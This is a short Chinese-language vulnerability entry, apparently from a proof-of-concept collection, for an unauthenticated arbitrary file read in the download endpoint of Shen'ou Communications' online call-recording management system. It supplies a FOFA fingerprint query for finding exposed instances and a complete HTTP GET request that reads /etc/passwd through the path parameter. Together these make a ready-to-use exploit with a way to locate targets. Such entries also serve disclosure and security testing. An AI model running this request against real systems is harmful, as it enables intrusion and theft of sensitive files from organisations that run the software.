## 申瓯通信在线录音管理系统download任意文件读取漏洞

申瓯通信在线录音管理系统download任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件。

## fofa

```
title="在线录音管理系统"
```

## poc

```
GET /main/download?path=/etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

![image-20240618124301943](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406181243156.png)